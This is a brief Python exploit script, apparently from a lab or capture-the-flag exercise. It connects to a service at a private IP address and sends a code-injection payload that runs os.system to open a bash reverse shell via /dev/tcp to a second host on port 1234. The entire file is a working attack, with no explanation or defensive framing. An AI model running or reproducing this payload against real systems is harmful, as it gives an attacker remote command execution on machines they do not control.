import socket

HOST = '10.48.134.140'
PORT = 8000
payload = """__import__('os').system('bash -c "bash -i >& /dev/tcp/192.168.240.118/1234 0>&1"')"""

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
	s.connect((HOST, PORT))
	s.sendall(payload.encode() + b'\n')
	response = s.recv(4096)
	print(response.decode())
